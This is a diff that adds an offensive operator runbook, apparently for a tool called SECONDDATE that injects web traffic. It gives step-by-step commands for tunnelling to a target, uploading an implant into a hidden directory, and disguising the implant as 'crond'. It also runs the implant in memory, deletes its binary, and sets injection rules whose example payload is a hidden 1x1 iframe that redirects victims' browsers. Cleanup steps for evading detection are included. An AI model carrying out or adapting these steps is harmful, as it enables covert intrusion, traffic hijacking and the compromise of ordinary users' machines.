@@ -1,0 +1,398 @@
+# SECONDDATE
+
+:syntax on
+
+#########
+# SET UP 
+#########
+
+# get tasking directories and put them on media
+# check op plan for correct tasking date
+/projects/web_proxy_tasking/to_lowside/YYYYMMDD/YYYYMMDD.HH.MM.SS-IP_ADDRESS
+
+# copy and extract binaries to /current/bin
+mz
+cp /mnt/zip/seconddate_tools.tar /current/bin
+cd /current/bin
+tar xvf /seconddate_binaries.tar
+
+# copy tasking directories to /current/bin/sd and extract
+cp -r /mnt/zip/TASKING /current/bin/sd
+cd /current/bin/sd
+
+
+# copy the SECONDDATE command and control binary to each tasking directory
+# the rules are set by relative path; 
+# the command and control binary needs to be in the same path as the inject and regex files 
+# tasking directory name format: YYYYMMDD.HH.MM.SS-IP_ADDRESS
+# inject tag name format:	 YYYYMMDDHHMMSS-IP_ADDRESS-inject-<number>.bin
+# regex file name format:        YYYYMMDDHHMMSS-IP_ADDRESS-regex-<number>.bin
+
+cp /current/bin/sd/1.1.1.1/Binaries/Seconddate_CnC /current/bin/sd/YYYYMMDD.HH.MM.SS-IP_ADDRESS
+
+
+#################
+# PREP COMMANDS
+#################
+
+# all commands to run at local Seconddate_CnC prompt are in commands.txt
+# you should have already copied it here:
+# /current/bin/sd/YYYYMMDD.HH.MM.SS-IP_ADDRESS/commands.txt
+cd /current/bin/sd/YYYYMMDD.HH.MM.SS-IP_ADDRESS
+
+egrep "disable" commands.txt > disable.txt
+egrep "rule" commands.txt | egrep -v "showrule --all" > rules.txt
+egrep "enable" commands.txt > enable.txt
+
+# open command files in gedit text editor; xemacs works too; vi doesn't work
+gedit disable.txt &
+# open the other files rules.txt and enable.txt
+
+
+####################
+# CONNECT TO IMPLANT
+###################
+
+# local_port	- listen on this port locally; i.e. the ops box; pick a random port
+# target_ip	- ip of target that is running SECONDDATE to which you want to connect
+# target_port	- port to which you'll connect to target; can be the same as local_port
+
+mx
+:%s/LOCAL_UDP_PORT/LOCAL_UDP_PORT/g
+:%s/TARGET_IP/TARGET_IP/g
+:%s/TARGET_UDP_PORT/TARGET_UDP_PORT/g
+`x
+
+# set up UDP tunnel from redirector; won't work locally on target box
+# u <random_local_port> <target_ip> <random_target_port>
+-tunnel
+u LOCAL_UDP_PORT TARGET_IP TARGET_UDP_PORT
+
+# in locally scripted window
+# run CnC
+# ./Seconddate_CnC 127.0.0.1 <udp tunnel port>
+cd /current/bin/sd/YYYYMMDD.HH.MM.SS-IP_ADDRESS
+./Seconddate_CnC 127.0.0.1 LOCAL_UDP_PORT
+
+# run command
+ping
+# should recieve an 'OK'
+
+# if you can't get an OK, the target may have rebooted; tool only runs in memory
+# connect to the target via -irtun and check to see if SECONDDATE is running
+# if it's not running you need to deploy
+ps -ef | grep IMPLANT_FILENAME
+
+cd /dev; ps -ef | grep IMPLANT_FILENAME
+
+
+##############
+# RUN COMMANDS
+#############
+
+# help menu
+?
+ #or
+help
+
+# do these first
+ping
+# synopsis of rules and injects
+getinfo
+# check rule log
+getlog
+
+# show all rules
+showrule --all
+
+# have gedit window with rules commands available
+# if you still have gedit open with the commands files, go to the disable commands section below
+# if you closed it after setup, reopen the commands files with gedit
+# command files you previously set up are here including the commands.txt file:
+# /current/bin/sd/YYYYMMDD.HH.MM.SS-IP_ADDRESS
+# open command files in gedit text editor; xemacs works too; vi doesn't work
+cd /current/bin/sd/YYYYMMDD.HH.MM.SS-IP_ADDRESS
+gedit disable.txt &
+# open the other files rules.txt and enable.txt from within gedit
+
+# run disable commands only for enabled rules you know are going to change
+# otherwise, disable all of the rules
+# disable commands are in the file disable.txt
+
+# clear log only if instructed to do so
+# will fail if any rules are enabled
+clearlog
+
+# set rules; make sure the rules in rules.txt match what is on target
+# rule commands are in the file rules.txt
+
+# enable rules; watch for "Enabled: yes" in each rule displayed
+# enable commands are in the file enable.txt
+
+# show all rules
+showrule --all
+
+# check for empty rule enabled:
+getinfo
+
+# if the matches/hits/injects are increasing rapidly, then you probably enabled an empty rule
+# find the emtpy rule that's enabled
+getlog
+
+# look for the rule that has the most hits
+# disable it and display it with showrule
+
+# done
+exit
+
+# copy script files
+# when finished with locally scripted window, type exit, or type CTL-D only once
+# this reveals the name of the script file
+cp script.<some_number> script.<target_ip>.seconddate.log
+# you can remove the original script if you like
+
+
+
+#########
+# DEPLOY 
+#########
+
+# if the target box rebooted, you'll have to deploy the tool
+# connect via -irtun
+
+# hidden_dir		- hidden directoy on the target
+#			  INCISION targets will have a manually created hidden directory
+#			  STOICSURGEON targets can run SECONDDATE from the STOICSURGEON directory
+# sd_binary _path	- where the SECONDATE binaries are lcoated on the ops box:
+#			  /current/bin/sd/1.1.1.1/Binaries
+# implant_filename	- what you want to call the SECONDDATE binary on target
+
+mx
+:%s:HIDDEN_DIR:HIDDEN_DIR:g
+:%s/SD_BINARY_PATH/SD_BINARY_PATH/g
+:%s/IMPLANT_FILENAME/IMPLANT_FILENAME/g
+`x
+
+# INCISION targets; skip if STOICSURGEON
+# create hidden directory on linux target if you don't have one already
+# mkdir -p /tmp/.<name_of_dir_to_hide>; __HMODE__=enable touch /tmp/.<name_ofdir_to_hide>
+# try to use a drectory name that blends in on teh target
+# example:
+# mkdir -p /tmp/.orbit561; __HMODE__=enable touch /tmp/.orbit561
+mkdir -p HIDDEN_DIR; __HMODE__=enable touch HIDDEN_DIR
+
+# make sure the directory was created
+-ls HIDDEN_DIR
+
+# make sure the directory is hidden
+# you should not see the hidden directory
+cd /dev; ls -al HIDDEN_DIR
+
+# cd to hidden directory
+# STOICSURGEON targets can run SECONDDATE from the STOICSURGEON directory
+# INCISION targets run from hidden directory
+# -cd /tmp/.orbit561
+-cd HIDDEN_DIR
+
+# put up tool
+# -put <tool_location_opsbox> <tool_name_on_target>
+# example
+# -put /current/bin/sd/1.1.1.1/Binaries/Seconddate_Implant crond
+-put SD_BINARY_PATH IMPLANT_FILENAME
+
+
+##################
+# START SECONDDATE
+##################
+
+# look for setsid
+which setsid
+# or
+locate setsid
+
+# run:
+setsid /bin/bash -c 'PATH="." crond' > /dev/null 2>&1 &
+
+# or, if there's no setsid
+# -shell
+# PATH=. crond
+-shell
+PATH=. IMPLANT_FILENAME
+# Ctrl-D to get out of shell and get your NOPEN prompt
+# be careful
+
+# if there's no setsid, get noserver pid (parent of nopen pid)
+# you'll have to kill the root noserver later when getting off target
+# i.e. the parent pid of the nopen window you're in
+-pid
+
+# INCISION targets make sure it's hidden
+# annotate pid of running implant in your opnotes
+# cd /dev; ps -ef | grep crond
+cd /dev; ps -ef | grep IMPLANT_FILENAME
+
+# remove implant
+# -rm crond
+-rm IMPLANT_FILENAME
+
+# in locally scripted window
+# run CnC
+./Seconddate_CnC 127.0.0.1 LOCAL_UDP_PORT
+
+# help menu
+help
+
+# ping
+ping
+
+
+###############
+# LEAVE RUNNING
+###############
+# may want to leave implant running and come back later
+# if implant is left running exit from the CnC tool
+exit
+
+# check lastlog for reboot frequecy
+last -100 | egrep "hutdow|eboo"
+
+# INCISION targets make sure the running implant is hidden
+# cd /dev; ps -ef grep <implant_filename>
+cd /dev; ps -ef grep IMPLANT_FILENAME
+
+
+###########
+# UNINSTALL
+###########
+# to stop running implant in preparation for leaving target box
+# in local CnC window that's scripted, uninstall the implant 
+uninstall
+
+# in NOPEN window
+# check process list; make it's not hung; if hung, kill it
+kill -9 <implant_pid>
+
+
+##########
+# FINISHED
+##########
+# getting ready to get off the target
+# to burn or not to burn?
+# read all lof the following before getting off target
+# if you're not leaving the implant running after getting off the target:
+#   - make sure you uninstall the implant as stated above
+#   - ensure it not hung; if so, kill it
+#   - then burn
+#
+# if you're on target under a noserver that did not spawn the implant 
+# process you may burn, i.e. the implant process is not the child
+# of the noserver process 
+#
+# if you ran the implant using 'setsid', you may also burn:
+-burn
+
+# if you ran the implant under your present noserver and wish to leave it
+# running, you need to make sure the implant continues when done with target
+# if there was no 'setsid' on the target box when you ran the implant:
+#   - kill the noserver that is listening under which you started the implant
+# if you burn in this case the implant process will be killed
+kill -9 <noserver_pid>
+
+#   - use "-exit" to get out of all nopen windows
+-exit
+
+# check your connection to the implant from the redirector next to the 
+# target running the implant
+# run a few commands
+ping
+getinfo
+
+# if connection is OK then you're done
+ping
+# should recieve an 'OK'
+
+# if you can't connect to the implant
+# get back up on target and check to see if implant is still running
+# if the implant is not running you may have missed something when running
+# the implant or disconnecting
+# put it back up and run it again
+# if you can't connect and the implant is running try troubleshooting 
+# the ports you're using
+
+# copy script files
+# when finished with locally scripted window, CTL-D only once
+# this reveals the name of the script file
+cp script.<some_number> script.<target_ip>.seconddate.log
+# you can remove the original script if you like
+
+
+
+
+#///////////////////////////////
+# TASKING BY HAND - THE OLD WAY
+#//////////////////////////////
+
+#############
+# INJECT FILE
+#############
+# configure inject file 
+# you will need to have a file containing the data for the inject packet
+# first the http info:
+# then the tag followed by 2 carriage retruns
+# example
+<inject_file_begin>
+HTTP/1.1 200 OK
+Pragma: no-cache
+Content-Type: text/html
+Cache-Control: no-cache,no-store
+
+<html><meta http-equiv="refresh" content="0"><body><iframe src="<REPLACE_WITH_URL_TO_USE>"height="1" width="1" scrolling="no" frameborder="0" unselectable="yes"marginheight="0" marginwidth="0"></iframe></body></html>
+
+<inject_file_end>
+
+#####################
+# REGULAR EXPRESSIONS
+#####################
+# regular expression file
+# needed to pass to implant as argument when using regex in a rule
+# can't have any carriage returns or newlines in the file
+# it must only contain the characters relative to the regex
+# use vi or echo:
+vi -b -c "set noeol" <filename>
+# or
+echo -n <regex> > <filename>
+
+#######
+# RULES
+#######
+# set rule
+# rule 1 --srcaddr <target_network_address> --srcmask 255.255.255.0 --dstport 80 --maxinjections 10 --injectwindow 600 --nocheckregex --injectfile pkt
+# examples:
+rule 1 --dstport 80 --maxinjections 2 --injectwindow 600 --regexfile <regex_file_1> --injectfile pkt
+rule 2 --dstport 80 --maxinjections 2 --injectwindow 600 --regexfile <regex_file_2> --injectfile pkt
+
+# showrule
+showrule 1
+# to show all rules you'll have to wait a bit
+# the tool will iterate through all 64 whether emtpy or not
+
+# enable rule(s)
+# you have to enable them individually
+enable rule 1
+
+# check for hits
+getinfo
+
+# check log
+getlog
+
+# when done disable rules
+disable 1
+
+# get last dump of log
+getlog
+
+# clear log
+clearlog
+
+
